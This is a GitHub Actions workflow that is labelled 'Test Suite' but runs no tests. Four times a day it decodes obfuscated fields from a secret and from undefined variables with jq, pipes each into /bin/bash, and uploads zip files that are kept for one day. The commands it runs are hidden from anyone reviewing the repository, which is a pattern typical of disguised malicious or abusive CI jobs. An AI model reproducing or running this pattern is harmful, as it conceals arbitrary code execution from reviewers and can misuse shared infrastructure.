name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '1 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          yps08: ${{ secrets.yps08 }}
        run: |
          printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
          echo $ord818 | jq -r .q37471 | /bin/bash
          echo $rb97925 | jq -r .zzqv69 | /bin/bash
          echo $fl963 | jq -r .x2 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: fYxLiuQB
          path: "*.zip"
          retention-days: 1
